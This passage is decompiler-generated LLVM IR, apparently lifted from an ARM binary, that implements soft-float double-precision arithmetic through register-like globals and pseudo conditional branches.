  %v10_1f454 = select i1 %v1_1f454, i1 %v8_1f454, i1 %v9_1f454
  %v1_1f458 = add nsw i32 %v4_1f454, 768
  store i32 %v1_1f458, i32* %r4.global-to-local, align 4
  br i1 %v10_1f454, label %dec_label_pc_1f468, label %dec_label_pc_1f460

dec_label_pc_1f460:                               ; preds = %bb95
  %v3_1f460 = udiv i32 %v5_1f434, 2
  store i32 %v3_1f460, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f468

dec_label_pc_1f468:                               ; preds = %bb95, %dec_label_pc_1f460
  %v0_1f470 = phi i32 [ %v5_1f434, %bb95 ], [ %v3_1f460, %dec_label_pc_1f460 ]
  %v0_1f474 = phi i32 [ %v3_1f438, %bb95 ], [ 0, %dec_label_pc_1f460 ]
  %v2_1f468 = sub i32 %v3_1f444, %v0_1f474
  store i32 %v2_1f468, i32* %r6.global-to-local, align 4
  %v3_1f468 = icmp uge i32 %v3_1f444, %v0_1f474
  %v3_1f46c = icmp eq i1 %v3_1f468, false
  %v4_1f46c = sub nsw i32 %v5_1f440, %v0_1f470
  %v6_1f46c = sext i1 %v3_1f46c to i32
  %v7_1f46c = add nsw i32 %v6_1f46c, %v4_1f46c
  store i32 %v7_1f46c, i32* %r5.global-to-local, align 4
  %v3_1f470 = udiv i32 %v0_1f470, 2
  store i32 %v3_1f470, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f480.outer

dec_label_pc_1f480.outer:                         ; preds = %dec_label_pc_1f518, %dec_label_pc_1f468
  %v1_1f52c.ph = phi i32 [ %v2_1f518, %dec_label_pc_1f518 ], [ %v1_1f448, %dec_label_pc_1f468 ]
  %v0_1f484.ph = phi i32 [ %v5_1f4f4, %dec_label_pc_1f518 ], [ %v7_1f46c, %dec_label_pc_1f468 ]
  %v1_1f488.ph = phi i32 [ %v3_1f4f8, %dec_label_pc_1f518 ], [ %v2_1f468, %dec_label_pc_1f468 ]
  %v5_1f50017.ph = phi i32 [ %v5_1f500, %dec_label_pc_1f518 ], [ %v3_1f470, %dec_label_pc_1f468 ]
  %v3_1f50413.ph = phi i32 [ %v3_1f504, %dec_label_pc_1f518 ], [ 0, %dec_label_pc_1f468 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1f518 ], [ 1048576, %dec_label_pc_1f468 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1f518 ], [ 524288, %dec_label_pc_1f468 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1f480

dec_label_pc_1f480:                               ; preds = %dec_label_pc_1f480.outer, %dec_label_pc_1f4f0
  %v1_1f4e459 = phi i32 [ %v2_1f52c, %dec_label_pc_1f4f0 ], [ %storemerge133, %dec_label_pc_1f480.outer ]
  %v1_1f490 = phi i32 [ %v1_1f49032, %dec_label_pc_1f4f0 ], [ %storemerge133, %dec_label_pc_1f480.outer ]
  %v1_1f4ac41 = phi i32 [ %v1_1f4ac43, %dec_label_pc_1f4f0 ], [ %storemerge133, %dec_label_pc_1f480.outer ]
  %v1_1f4c850 = phi i32 [ %v1_1f4c852, %dec_label_pc_1f4f0 ], [ %storemerge133, %dec_label_pc_1f480.outer ]
  %v0_1f508 = phi i32 [ %v3_1f508, %dec_label_pc_1f4f0 ], [ %storemerge, %dec_label_pc_1f480.outer ]
  %v0_1f484 = phi i32 [ %v5_1f4f4, %dec_label_pc_1f4f0 ], [ %v0_1f484.ph, %dec_label_pc_1f480.outer ]
  %v1_1f488 = phi i32 [ %v3_1f4f8, %dec_label_pc_1f4f0 ], [ %v1_1f488.ph, %dec_label_pc_1f480.outer ]
  %v5_1f50017 = phi i32 [ %v5_1f500, %dec_label_pc_1f4f0 ], [ %v5_1f50017.ph, %dec_label_pc_1f480.outer ]
  %v3_1f50413 = phi i32 [ %v3_1f504, %dec_label_pc_1f4f0 ], [ %v3_1f50413.ph, %dec_label_pc_1f480.outer ]
  %v3_1f480 = icmp uge i32 %v1_1f488, %v3_1f50413
  %v3_1f484 = icmp eq i1 %v3_1f480, false
  %v4_1f484 = sub i32 %v0_1f484, %v5_1f50017
  %v6_1f484 = sext i1 %v3_1f484 to i32
  %v7_1f484 = add i32 %v6_1f484, %v4_1f484
  %v8_1f484 = zext i1 %v3_1f484 to i32
  %v9_1f484 = sub i32 %v7_1f484, %v8_1f484
  %v10_1f484 = icmp ult i32 %v0_1f484, %v9_1f484
  %v11_1f484 = icmp ne i32 %v5_1f50017, -1
  %v12_1f484 = or i1 %v11_1f484, %v10_1f484
  %v13_1f484 = icmp ult i32 %v0_1f484, %v5_1f50017
  %v14_1f484 = select i1 %v3_1f484, i1 %v12_1f484, i1 %v13_1f484
  br i1 %v14_1f484, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1f480
  %v3_1f488 = sub i32 %v1_1f488, %v3_1f50413
  store i32 %v3_1f488, i32* %r6.global-to-local, align 4
  store i32 %v7_1f484, i32* %r5.global-to-local, align 4
  %v3_1f490 = or i32 %v1_1f490, %v0_1f508
  store i32 %v3_1f490, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1f480, %bb96
  %v1_1f4e458 = phi i32 [ %v1_1f4e459, %dec_label_pc_1f480 ], [ %v3_1f490, %bb96 ]
  %v1_1f49035 = phi i32 [ %v1_1f490, %dec_label_pc_1f480 ], [ %v3_1f490, %bb96 ]
  %v1_1f4ac = phi i32 [ %v1_1f4ac41, %dec_label_pc_1f480 ], [ %v3_1f490, %bb96 ]
  %v1_1f4c849 = phi i32 [ %v1_1f4c850, %dec_label_pc_1f480 ], [ %v3_1f490, %bb96 ]
  %v0_1f4a0 = phi i32 [ %v0_1f484, %dec_label_pc_1f480 ], [ %v7_1f484, %bb96 ]
  %v1_1f4a4 = phi i32 [ %v1_1f488, %dec_label_pc_1f480 ], [ %v3_1f488, %bb96 ]
  %v1_1f494 = urem i32 %v5_1f50017, 2
  %v2_1f494 = icmp ne i32 %v1_1f494, 0
  %v3_1f494 = udiv i32 %v5_1f50017, 2
  %v3_1f498 = zext i1 %v2_1f494 to i32
  %v6_1f498 = zext i32 %v3_1f50413 to i64
  %v7_1f498 = sub i32 33, %v3_1f50413
  %v8_1f498 = zext i32 %v7_1f498 to i64
  %v9_1f498 = shl i64 %v6_1f498, %v8_1f498
  %v10_1f498 = sub i32 32, %v3_1f50413
  %v11_1f498 = shl i32 %v3_1f498, %v10_1f498
  %v12_1f498 = zext i32 %v11_1f498 to i64
  %v14_1f498 = or i64 %v12_1f498, %v9_1f498
  %v15_1f498 = trunc i64 %v14_1f498 to i32
  %v3_1f49c = icmp uge i32 %v1_1f4a4, %v15_1f498
  %v3_1f4a0 = icmp eq i1 %v3_1f49c, false
  %v4_1f4a0 = sub i32 %v0_1f4a0, %v3_1f494
  %v6_1f4a0 = sext i1 %v3_1f4a0 to i32
  %v7_1f4a0 = add i32 %v6_1f4a0, %v4_1f4a0
  %v13_1f4a0 = icmp ult i32 %v0_1f4a0, %v3_1f494
  %v14_1f4a0 = or i1 %v13_1f4a0, %v3_1f4a0
  br i1 %v14_1f4a0, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1f4a4 = sub i32 %v1_1f4a4, %v15_1f498
  store i32 %v3_1f4a4, i32* %r6.global-to-local, align 4
  store i32 %v7_1f4a0, i32* %r5.global-to-local, align 4
  %v5_1f4ac = udiv i32 %v0_1f508, 2
  %v6_1f4ac = or i32 %v1_1f4ac, %v5_1f4ac
  store i32 %v6_1f4ac, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1f4e457 = phi i32 [ %v1_1f4e458, %.thread4 ], [ %v6_1f4ac, %bb97 ]
  %v1_1f49034 = phi i32 [ %v1_1f49035, %.thread4 ], [ %v6_1f4ac, %bb97 ]
  %v1_1f4ac45 = phi i32 [ %v1_1f4ac, %.thread4 ], [ %v6_1f4ac, %bb97 ]
  %v1_1f4c8 = phi i32 [ %v1_1f4c849, %.thread4 ], [ %v6_1f4ac, %bb97 ]
  %v0_1f4bc = phi i32 [ %v0_1f4a0, %.thread4 ], [ %v7_1f4a0, %bb97 ]
  %v1_1f4c0 = phi i32 [ %v1_1f4a4, %.thread4 ], [ %v3_1f4a4, %bb97 ]
  %v1_1f4b0 = urem i32 %v3_1f494, 2
  %v2_1f4b0 = icmp ne i32 %v1_1f4b0, 0
  %v3_1f4b0 = udiv i32 %v5_1f50017, 4
  %v3_1f4b4 = zext i1 %v2_1f4b0 to i32
  %v6_1f4b4 = and i64 %v14_1f498, 4294967295
  %v7_1f4b4 = sub i32 33, %v15_1f498
  %v8_1f4b4 = zext i32 %v7_1f4b4 to i64
  %v9_1f4b4 = shl i64 %v6_1f4b4, %v8_1f4b4
  %v10_1f4b4 = sub i32 32, %v15_1f498
  %v11_1f4b4 = shl i32 %v3_1f4b4, %v10_1f4b4
  %v12_1f4b4 = zext i32 %v11_1f4b4 to i64
  %v14_1f4b4 = or i64 %v12_1f4b4, %v9_1f4b4
  %v15_1f4b4 = trunc i64 %v14_1f4b4 to i32
  %v3_1f4b8 = icmp uge i32 %v1_1f4c0, %v15_1f4b4
  %v3_1f4bc = icmp eq i1 %v3_1f4b8, false
  %v4_1f4bc = sub i32 %v0_1f4bc, %v3_1f4b0
  %v6_1f4bc = sext i1 %v3_1f4bc to i32
  %v7_1f4bc = add i32 %v6_1f4bc, %v4_1f4bc
  %v13_1f4bc = icmp ult i32 %v0_1f4bc, %v3_1f4b0
  %v14_1f4bc = or i1 %v13_1f4bc, %v3_1f4bc
  br i1 %v14_1f4bc, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1f4c0 = sub i32 %v1_1f4c0, %v15_1f4b4
  store i32 %v3_1f4c0, i32* %r6.global-to-local, align 4
  store i32 %v7_1f4bc, i32* %r5.global-to-local, align 4
  %v5_1f4c8 = udiv i32 %v0_1f508, 4
  %v6_1f4c8 = or i32 %v1_1f4c8, %v5_1f4c8
  store i32 %v6_1f4c8, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1f4e4 = phi i32 [ %v1_1f4e457, %.thread6 ], [ %v6_1f4c8, %bb98 ]
  %v1_1f49033 = phi i32 [ %v1_1f49034, %.thread6 ], [ %v6_1f4c8, %bb98 ]
  %v1_1f4ac44 = phi i32 [ %v1_1f4ac45, %.thread6 ], [ %v6_1f4c8, %bb98 ]
  %v1_1f4c853 = phi i32 [ %v1_1f4c8, %.thread6 ], [ %v6_1f4c8, %bb98 ]
  %v0_1f4d8 = phi i32 [ %v0_1f4bc, %.thread6 ], [ %v7_1f4bc, %bb98 ]
  %v1_1f4dc = phi i32 [ %v1_1f4c0, %.thread6 ], [ %v3_1f4c0, %bb98 ]
  %v1_1f4cc = urem i32 %v3_1f4b0, 2
  %v2_1f4cc = icmp ne i32 %v1_1f4cc, 0
  %v3_1f4cc = udiv i32 %v5_1f50017, 8
  %v3_1f4d0 = zext i1 %v2_1f4cc to i32
  %v6_1f4d0 = and i64 %v14_1f4b4, 4294967295
  %v7_1f4d0 = sub i32 33, %v15_1f4b4
  %v8_1f4d0 = zext i32 %v7_1f4d0 to i64
  %v9_1f4d0 = shl i64 %v6_1f4d0, %v8_1f4d0
  %v10_1f4d0 = sub i32 32, %v15_1f4b4
  %v11_1f4d0 = shl i32 %v3_1f4d0, %v10_1f4d0
  %v12_1f4d0 = zext i32 %v11_1f4d0 to i64
  %v14_1f4d0 = or i64 %v12_1f4d0, %v9_1f4d0
  %v15_1f4d0 = trunc i64 %v14_1f4d0 to i32
  %v3_1f4d4 = icmp uge i32 %v1_1f4dc, %v15_1f4d0
  %v3_1f4d8 = icmp eq i1 %v3_1f4d4, false
  %v4_1f4d8 = sub i32 %v0_1f4d8, %v3_1f4cc
  %v6_1f4d8 = sext i1 %v3_1f4d8 to i32
  %v7_1f4d8 = add i32 %v6_1f4d8, %v4_1f4d8
  %v13_1f4d8 = icmp ult i32 %v0_1f4d8, %v3_1f4cc
  %v14_1f4d8 = or i1 %v13_1f4d8, %v3_1f4d8
  br i1 %v14_1f4d8, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1f4dc = sub i32 %v1_1f4dc, %v15_1f4d0
  store i32 %v3_1f4dc, i32* %r6.global-to-local, align 4
  store i32 %v7_1f4d8, i32* %r5.global-to-local, align 4
  %v5_1f4e4 = udiv i32 %v0_1f508, 8
  %v6_1f4e4 = or i32 %v1_1f4e4, %v5_1f4e4
  store i32 %v6_1f4e4, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1f4f4 = phi i32 [ %v1_1f4dc, %.thread8 ], [ %v3_1f4dc, %bb100 ]
  %v0_1f4f0 = phi i32 [ %v0_1f4d8, %.thread8 ], [ %v7_1f4d8, %bb100 ]
  %v2_1f52c = phi i32 [ %v1_1f4e4, %.thread8 ], [ %v6_1f4e4, %bb100 ]
  %v1_1f49032 = phi i32 [ %v1_1f49033, %.thread8 ], [ %v6_1f4e4, %bb100 ]
  %v1_1f4ac43 = phi i32 [ %v1_1f4ac44, %.thread8 ], [ %v6_1f4e4, %bb100 ]
  %v1_1f4c852 = phi i32 [ %v1_1f4c853, %.thread8 ], [ %v6_1f4e4, %bb100 ]
  %v2_1f4e8 = or i32 %v0_1f4f0, %v1_1f4f4
  %v4_1f4e8 = icmp eq i32 %v2_1f4e8, 0
  br i1 %v4_1f4e8, label %dec_label_pc_1f528, label %dec_label_pc_1f4f0

dec_label_pc_1f4f0:                               ; preds = %.thread10
  %v3_1f4f0 = mul i32 %v0_1f4f0, 16
  %v4_1f4f4 = udiv i32 %v1_1f4f4, 268435456
  %v5_1f4f4 = or i32 %v3_1f4f0, %v4_1f4f4
  store i32 %v5_1f4f4, i32* %r5.global-to-local, align 4
  %v3_1f4f8 = mul i32 %v1_1f4f4, 16
  store i32 %v3_1f4f8, i32* %r6.global-to-local, align 4
  %v3_1f4fc = mul nuw i32 %v3_1f4cc, 8
  %v4_1f500 = udiv i32 %v15_1f4d0, 536870912
  %v5_1f500 = or i32 %v4_1f500, %v3_1f4fc
  %v3_1f504 = mul i32 %v15_1f4d0, 8
  %v3_1f508 = udiv i32 %v0_1f508, 16
  store i32 %v3_1f508, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1f508, 16
  br i1 %tmp, label %dec_label_pc_1f510, label %dec_label_pc_1f480

dec_label_pc_1f510:                               ; preds = %dec_label_pc_1f4f0
  %v1_1f510 = and i32 %v1_1f52c.ph, 1048576
  %v2_1f510 = icmp eq i32 %v1_1f510, 0
  br i1 %v2_1f510, label %dec_label_pc_1f518, label %.thread11.loopexit

dec_label_pc_1f518:                               ; preds = %dec_label_pc_1f510
  %v2_1f518 = or i32 %v2_1f52c, %v1_1f52c.ph
  store i32 %v2_1f518, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f480.outer

dec_label_pc_1f528:                               ; preds = %.thread10
  store i32 %v15_1f4d0, i32* %r2.global-to-local, align 4
  store i32 %v3_1f4cc, i32* %r3.global-to-local, align 4
  %v1_1f528 = and i32 %v1_1f52c.ph, 1048576
  %v2_1f528 = icmp eq i32 %v1_1f528, 0
  br i1 %v2_1f528, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1f528
  %v3_1f52c = or i32 %v2_1f52c, %v1_1f52c.ph
  store i32 %v3_1f52c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1f510
  store i32 %v3_1f504, i32* %r2.global-to-local, align 4
  store i32 %v5_1f500, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1f528, %bb101
  %v1_1f534 = add nsw i32 %v4_1f454, 515
  store i32 %v1_1f534, i32* %ip.global-to-local, align 4
  %v2_1f534 = icmp ugt i32 %v1_1f458, 252
  %v7_1f534 = icmp eq i32 %v1_1f458, 253
  %v2_1f538 = xor i1 %v7_1f534, true
  %v3_1f538 = and i1 %v2_1f534, %v2_1f538
  br i1 %v3_1f538, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1f538 = icmp ugt i32 %v1_1f534, 1791
  %v11_1f538 = icmp eq i32 %v1_1f534, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1f53c = phi i1 [ %v7_1f534, %.thread11 ], [ %v11_1f538, %bb102 ]
  %v0_1f53c = phi i1 [ %v2_1f534, %.thread11 ], [ %v6_1f538, %bb102 ]
  %v2_1f53c = xor i1 %v1_1f53c, true
  %v3_1f53c = and i1 %v0_1f53c, %v2_1f53c
  call void @__pseudo_cond_branch(i1 %v3_1f53c, i32 ptrtoint (i32* @global_var_1f250.1285 to i32))
  %v0_1f540 = load i32, i32* %r5.global-to-local, align 4
  %v1_1f540 = load i32, i32* %r3.global-to-local, align 4
  %v2_1f540 = sub i32 %v0_1f540, %v1_1f540
  store i32 %v2_1f540, i32* %ip.global-to-local, align 4
  %v3_1f540 = icmp uge i32 %v0_1f540, %v1_1f540
  %v9_1f540 = icmp eq i32 %v0_1f540, %v1_1f540
  br i1 %v9_1f540, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1f544 = load i32, i32* %r6.global-to-local, align 4
  %v2_1f544 = load i32, i32* %r2.global-to-local, align 4
  %v3_1f544 = sub i32 %v1_1f544, %v2_1f544
  store i32 %v3_1f544, i32* %ip.global-to-local, align 4
  %v4_1f544 = icmp uge i32 %v1_1f544, %v2_1f544
  %v10_1f544 = icmp eq i32 %v1_1f544, %v2_1f544
  br i1 %v10_1f544, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1f548 = load i32, i32* %r0.global-to-local, align 4
  %v2_1f548 = urem i32 %v1_1f548, 2
  %v3_1f548 = icmp ne i32 %v2_1f548, 0
  %v4_1f548 = udiv i32 %v1_1f548, 2
  store i32 %v4_1f548, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1f54c = phi i1 [ %v3_1f540, %bb103 ], [ %v4_1f544, %bb104 ], [ %v3_1f548, %bb105 ]
  %v0_1f54c = load i32, i32* %r0.global-to-local, align 4
  %v2_1f54c = zext i1 %v1_1f54c to i32
  %v3_1f54c = add i32 %v2_1f54c, %v0_1f54c
  store i32 %v3_1f54c, i32* %r0.global-to-local, align 4
  %v0_1f550 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f550 = load i32, i32* %r4.global-to-local, align 4
  %v2_1f550 = and i32 %v1_1f550, 4096
  %v3_1f550 = icmp ne i32 %v2_1f550, 0
  %v4_1f550 = mul i32 %v1_1f550, 1048576
  %v6_1f550 = add i32 %v4_1f550, %v0_1f550
  %v7_1f550 = zext i1 %v3_1f550 to i32
  %v8_1f550 = add i32 %v7_1f550, %v6_1f550
  store i32 %v8_1f550, i32* %r1.global-to-local, align 4
  %v2_1f554 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1f554, i32* %r4.global-to-local, align 4
  store i32 %v6_1f3f4, i32* %r5.global-to-local, align 4
  store i32 %v9_1f3f4, i32* %r6.global-to-local, align 4
  ret i32 %v3_1f54c

dec_label_pc_1f55c:                               ; preds = %dec_label_pc_1f414
  %v1_1f55c = and i32 %v2_1f418, -2147483648
  %v4_1f560 = urem i32 %v1_1f400, 1048576
  %v5_1f560 = or i32 %v1_1f55c, %v4_1f560
  store i32 %v5_1f560, i32* %r1.global-to-local, align 4
  %v6_1f564 = add nsw i32 %v2_1f414, 1023
  store i32 %v6_1f564, i32* %r4.global-to-local, align 4
  %v8_1f564 = sub nsw i32 0, %v2_1f414
  %v9_1f564 = and i32 %v6_1f564, %v8_1f564
  %v11_1f564 = icmp slt i32 %v2_1f414, -1023
  %v12_1f564 = icmp eq i32 %v6_1f564, 0
  %v7_1f568 = icmp sgt i32 %v2_1f414, -1023
  br i1 %v7_1f568, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1f55c
  %v10_1f568 = sub nsw i32 1024, %v2_1f414
  store i32 %v10_1f568, i32* %r5.global-to-local, align 4
  %v14_1f568 = and i32 %v10_1f568, %v6_1f564
  %v16_1f568 = icmp slt i32 %v10_1f568, 0
  %v17_1f568 = icmp eq i32 %v6_1f564, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1f55c, %bb106
  %v3_1f574.in = phi i32 [ %v9_1f564, %dec_label_pc_1f55c ], [ %v14_1f568, %bb106 ]
  %v2_1f574 = phi i1 [ %v11_1f564, %dec_label_pc_1f55c ], [ %v16_1f568, %bb106 ]
  %v1_1f574 = phi i1 [ %v12_1f564, %dec_label_pc_1f55c ], [ %v17_1f568, %bb106 ]
  %v3_1f574 = icmp slt i32 %v3_1f574.in, 0
  %v3_1f56c = xor i1 %v3_1f574, %v2_1f574
  %v4_1f56c = or i1 %v1_1f574, %v3_1f56c
  br i1 %v4_1f56c, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1f56c84 = mul i32 %v6_1f564, 1048576
  %v10_1f56c85 = or i32 %v9_1f56c84, %v5_1f560
  store i32 %v10_1f56c85, i32* %r1.global-to-local, align 4
  store i32 %v3_1f3f4, i32* %r4.global-to-local, align 4
  store i32 %v6_1f3f4, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1f574 = phi i32 [ %v12_1f3f4, %bb108 ], [ %v1_1f55c, %bb107 ]
  %v6_1f574 = xor i1 %v4_1f56c, true
  call void @__pseudo_cond_branch(i1 %v6_1f574, i32 %v0_1f574)
  %v0_1f578 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f578 = or i32 %v0_1f578, 1048576
  store i32 %v1_1f578, i32* @r1, align 4
  %v0_1f580 = load i32, i32* %r4.global-to-local, align 4
  %v1_1f580 = add i32 %v0_1f580, -1
  store i32 %v1_1f580, i32* @r4, align 4
  %v3_1f580 = sub i32 0, %v0_1f580
  %v4_1f580 = and i32 %v0_1f580, %v3_1f580
  %v5_1f580 = icmp slt i32 %v4_1f580, 0
  store i1 %v5_1f580, i1* @cpsr_v, align 1
  %v6_1f580 = icmp slt i32 %v1_1f580, 0
  store i1 %v6_1f580, i1* @cpsr_n, align 1
  %v7_1f580 = icmp eq i32 %v0_1f580, 1
  store i1 %v7_1f580, i1* @cpsr_z, align 1
  %v0_1f584 = call i32 @function_1f250()
  store i32 %v0_1f584, i32* @r0, align 4
  %v0_1f58c = call i32 @function_1f250()
  store i32 %v0_1f58c, i32* @r0, align 4
  %v0_1f590.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1f594.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1f590

dec_label_pc_1f590:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1f590.pre-phi = phi i32 [ %v5_1f404, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1f404, %bb91 ], [ %v5_1f404, %.thread ]
  %v0_1f594 = phi i32 [ %v5_1f400, %.thread1 ], [ %v5_1f400, %.thread2 ], [ %v5_1f400, %bb91 ], [ %v0_1f594.pre, %.thread ]
  %v2_1f598 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1f590.pre, %.thread ]
  %v5_1f590 = and i32 %v2_1f598, %v4_1f590.pre-phi
  store i32 %v5_1f590, i32* @r5, align 4
  %v4_1f594 = icmp eq i32 %v2_1f598, %v0_1f594
  br i1 %v4_1f594, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1f590
  %v5_1f598 = icmp eq i32 %v5_1f590, %v2_1f598
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1f590, %bb109
  %v0_1f59c = phi i1 [ false, %dec_label_pc_1f590 ], [ %v5_1f598, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1f59c, i32 ptrtoint (i32* @global_var_1f3e4.1287 to i32))
  %v0_1f5a0 = load i32, i32* @r4, align 4
  %v1_1f5a0 = load i32, i32* %ip.global-to-local, align 4
  %v4_1f5a0 = icmp eq i32 %v1_1f5a0, %v0_1f5a0
  br i1 %v4_1f5a0, label %dec_label_pc_1f5a8, label %dec_label_pc_1f5c4

dec_label_pc_1f5a8:                               ; preds = %bb110
  %v0_1f5a8 = load i32, i32* @r0, align 4
  %v1_1f5a8 = load i32, i32* @r1, align 4
  %v4_1f5a8 = mul i32 %v1_1f5a8, 4096
  %v5_1f5a8 = or i32 %v4_1f5a8, %v0_1f5a8
  store i32 %v5_1f5a8, i32* %r4.global-to-local, align 4
  %v1_1f5ac = icmp ne i32 %v5_1f5a8, 0
  call void @__pseudo_cond_branch(i1 %v1_1f5ac, i32 ptrtoint (i32* @global_var_1f3e4.1287 to i32))
  %v0_1f5b0 = load i32, i32* @r5, align 4
  %v1_1f5b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1f5b4 = icmp ne i32 %v1_1f5b0, %v0_1f5b0
  call void @__pseudo_cond_branch(i1 %v1_1f5b4, i32 ptrtoint (i32* @global_var_1f3c8.1288 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1f5c0 = call i32 @function_1f3e4(i32 %arg3, i32 %arg4)
  store i32 %v2_1f5c0, i32* @r0, align 4
  %v1_1f5c4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1f5c4

dec_label_pc_1f5c4:                               ; preds = %bb110, %dec_label_pc_1f5a8
  %v1_1f5c4 = phi i32 [ %v1_1f5a0, %bb110 ], [ %v1_1f5c4.pre, %dec_label_pc_1f5a8 ]
  %v0_1f5c4 = load i32, i32* @r5, align 4
  %v4_1f5c4 = icmp eq i32 %v0_1f5c4, %v1_1f5c4
  br i1 %v4_1f5c4, label %dec_label_pc_1f5cc, label %dec_label_pc_1f5c4.dec_label_pc_1f5e0_crit_edge

dec_label_pc_1f5c4.dec_label_pc_1f5e0_crit_edge:  ; preds = %dec_label_pc_1f5c4
  %v0_1f5e0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1f5e0

dec_label_pc_1f5cc:                               ; preds = %dec_label_pc_1f5c4
  %v4_1f5cc = mul i32 %arg4, 4096
  %v5_1f5cc = or i32 %v4_1f5cc, %arg3
  store i32 %v5_1f5cc, i32* %r5.global-to-local, align 4
  %v7_1f5cc = icmp eq i32 %v5_1f5cc, 0
  call void @__pseudo_cond_branch(i1 %v7_1f5cc, i32 ptrtoint (i32* @global_var_1f378.1289 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1f5dc = call i32 @function_1f3e4(i32 %arg3, i32 %arg4)
  store i32 %v2_1f5dc, i32* @r0, align 4
  br label %dec_label_pc_1f5e0

dec_label_pc_1f5e0:                               ; preds = %dec_label_pc_1f5c4.dec_label_pc_1f5e0_crit_edge, %dec_label_pc_1f5cc
  %v0_1f5e0 = phi i32 [ %v0_1f5e0.pre, %dec_label_pc_1f5c4.dec_label_pc_1f5e0_crit_edge ], [ %v2_1f5dc, %dec_label_pc_1f5cc ]
  %v1_1f5e0 = load i32, i32* @r1, align 4
  %v3_1f5e0 = mul i32 %v1_1f5e0, 2
  %v4_1f5e0 = or i32 %v3_1f5e0, %v0_1f5e0
  store i32 %v4_1f5e0, i32* %r6.global-to-local, align 4
  %v6_1f5e0 = icmp eq i32 %v4_1f5e0, 0
  br i1 %v6_1f5e0, label %dec_label_pc_1f5e0._crit_edge, label %bb111

dec_label_pc_1f5e0._crit_edge:                    ; preds = %dec_label_pc_1f5e0
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1f5e0
  %v4_1f5e4 = mul i32 %arg4, 2
  %v5_1f5e4 = or i32 %v4_1f5e4, %arg3
  store i32 %v5_1f5e4, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1f5e4, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1f5e0._crit_edge, %bb111
  %v4_1f5f4.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1f5e0._crit_edge ], [ %v5_1f5e4, %bb111 ]
  %v0_1f5e8 = phi i1 [ false, %dec_label_pc_1f5e0._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1f5e8, i32 ptrtoint (i32* @global_var_1f310.1290 to i32))
  %v0_1f5ec = load i32, i32* @r0, align 4
  %v1_1f5ec = load i32, i32* @r1, align 4
  %v3_1f5ec = mul i32 %v1_1f5ec, 2
  %v4_1f5ec = or i32 %v3_1f5ec, %v0_1f5ec
  store i32 %v4_1f5ec, i32* %r4.global-to-local, align 4
  %v1_1f5f0 = icmp ne i32 %v4_1f5ec, 0
  call void @__pseudo_cond_branch(i1 %v1_1f5f0, i32 ptrtoint (i32* @global_var_1f3c8.1288 to i32))
  store i32 %v4_1f5f4.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1f5f8 = icmp ne i32 %v4_1f5f4.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1f5f8, i32 ptrtoint (i32* @global_var_1f378.1289 to i32))
  %v0_1f5fc = load i32, i32* @r0, align 4
  %v1_1f5fc = load i32, i32* @r1, align 4
